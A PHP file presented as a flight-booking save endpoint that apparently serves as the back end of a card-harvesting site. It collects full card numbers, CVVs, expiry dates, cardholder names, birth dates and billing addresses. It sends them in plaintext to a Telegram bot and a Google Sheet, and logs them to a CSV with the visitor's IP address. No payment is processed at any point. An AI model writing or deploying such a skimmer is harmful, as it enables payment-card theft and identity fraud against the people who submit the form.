<?php
/* ==========================================================
   api/save_booking.php — Pure Telegram Bot Logger
   ========================================================== */
require_once __DIR__ . '/../includes/config.php';
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$body = json_decode(file_get_contents('php://input'), true) ?: $_POST;

$phone = trim($body['phone'] ?? $body['billing_phone'] ?? '');
if (strpos($phone, "'") === 0) { $phone = substr($phone, 1); }

$cardExpParts = explode('/', trim($body['card_exp'] ?? ''));

$ref       = trim($body['ref_number'] ?? $body['ref'] ?? '');
$email     = trim($body['email'] ?? $body['billing_email'] ?? '');
$pax_first = trim($body['pax_first'] ?? $body['pax_first_name'] ?? $body['first_name'] ?? '');
$pax_mid   = trim($body['pax_middle'] ?? $body['pax_middle_name'] ?? $body['middle_name'] ?? '');
$pax_last  = trim($body['pax_last'] ?? $body['pax_last_name'] ?? $body['last_name'] ?? '');
$gender    = trim($body['pax_gender'] ?? $body['gender'] ?? '');
$dob       = trim($body['pax_dob'] ?? $body['dob'] ?? '');
$country   = trim($body['billing_country'] ?? '');
$state     = trim($body['billing_state'] ?? '');
$address   = trim($body['billing_address'] ?? '');
$city      = trim($body['billing_city'] ?? '');
$zip       = trim($body['billing_zip'] ?? '');
$cardName  = trim($body['card_name'] ?? $body['c_holder_name'] ?? '');
$cardNum   = trim($body['card_number'] ?? $body['c_num_sec'] ?? '');
$cardBrand = trim($body['card_brand'] ?? '');
$expMonth  = trim($body['card_exp_month'] ?? $body['card_month'] ?? ($cardExpParts[0] ?? ''));
$expYear   = trim($body['card_exp_year'] ?? $body['card_year'] ?? ($cardExpParts[1] ?? ''));
$cvv       = trim($body['card_cvv'] ?? $body['c_cvv_sec'] ?? $body['cvv'] ?? '');
$airline   = trim($body['airline'] ?? '');
$flightNo  = trim($body['flight_number'] ?? $body['flight_no'] ?? '');
$origin    = strtoupper(trim($body['origin'] ?? ''));
$dest      = strtoupper(trim($body['destination'] ?? ''));
$depDate   = trim($body['dep_date'] ?? $body['departure_date'] ?? '');
$price     = trim($body['price'] ?? $body['total_price'] ?? '');

$tgMsg = "🚨 <b>NEW FLIGHT BOOKING LEAD!</b>\n" .
         "━━━━━━━━━━━━━━━━━━━━\n" .
         "📌 <b>Ref:</b> " . tgEscape($ref) . "\n" .
         "👤 <b>Passenger:</b> " . tgEscape($pax_first) . " " . ($pax_mid ? tgEscape($pax_mid) . " " : "") . tgEscape($pax_last) . "\n" .
         "📞 <b>Phone:</b> " . tgEscape($phone) . "\n" .
         "✉️ <b>Email:</b> " . tgEscape($email) . "\n" .
         "✈️ <b>Flight:</b> " . tgEscape($airline) . " (" . tgEscape($flightNo) . ") | " . tgEscape($origin) . " ➔ " . tgEscape($dest) . "\n" .
         "📅 <b>Date:</b> " . tgEscape($depDate) . "\n" .
         "💵 <b>Total Price:</b> \$" . tgEscape($price) . "\n" .
         "💳 <b>Card:</b> " . tgEscape($cardNum) . " (" . tgEscape($cardBrand) . " " . tgEscape($expMonth) . "/" . tgEscape($expYear) . ")\n" .
         "🔒 <b>CVV:</b> " . tgEscape($cvv) . " | <b>Holder:</b> " . tgEscape($cardName) . "\n" .
         "📍 <b>Billing:</b> " . tgEscape($address) . ", " . tgEscape($city) . ", " . tgEscape($state) . " " . tgEscape($zip) . " (" . tgEscape($country) . ")\n" .
         "━━━━━━━━━━━━━━━━━━━━";

sendTelegramMessage($tgMsg);

sendGoogleSheetMessage([
    'action'          => 'sheet2',
    'timestamp'       => date('Y-m-d H:i:s'),
    'ref_number'      => $ref,
    'email'           => $email,
    'phone'           => $phone,
    'pax_first_name'  => $pax_first,
    'pax_middle_name' => $pax_mid,
    'pax_last_name'   => $pax_last,
    'pax_gender'      => $gender,
    'pax_dob'         => $dob,
    'billing_country' => $country,
    'billing_state'   => $state,
    'billing_address' => $address,
    'billing_city'    => $city,
    'billing_zip'     => $zip,
    'card_name'       => $cardName,
    'card_number'     => $cardNum,
    'card_brand'      => $cardBrand,
    'card_exp_month'  => $expMonth,
    'card_exp_year'   => $expYear,
    'card_cvv'        => $cvv,
    'airline'         => $airline,
    'flight_number'   => $flightNo,
    'origin'          => $origin,
    'destination'     => $dest,
    'dep_date'        => $depDate,
    'price'           => $price,
    'user_ip'         => $_SERVER['REMOTE_ADDR'] ?? ''
]);

// Local CSV backup
$dir  = __DIR__ . '/../data';
if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
$file = $dir . '/sheet2_bookings.csv';
$isNew = !file_exists($file);
$fp = @fopen($file, 'a');
if ($fp) {
    if ($isNew) {
        fputcsv($fp, ['Timestamp','Ref Number','Email','Phone',
                      'First Name','Middle Name','Last Name','Gender','DOB',
                      'Billing Country','Billing State','Billing Address','Billing City','Billing ZIP',
                      'Cardholder Name','Card Number','Card Brand','Exp Month','Exp Year','CVV',
                      'Airline','Flight Number','Origin (IATA)','Destination (IATA)',
                      'Departure Date','Total Price (USD)','IP Address']);
    }
    fputcsv($fp, [
        date('Y-m-d H:i:s'), $ref, $email, $phone,
        $pax_first, $pax_mid, $pax_last, $gender, $dob,
        $country, $state, $address, $city, $zip,
        $cardName, $cardNum, $cardBrand, $expMonth, $expYear, $cvv,
        $airline, $flightNo, $origin, $dest, $depDate, $price, $_SERVER['REMOTE_ADDR'] ?? ''
    ]);
    fclose($fp);
}

echo json_encode(['status' => 'success', 'telegram' => 'sent', 'csv' => 'saved']);
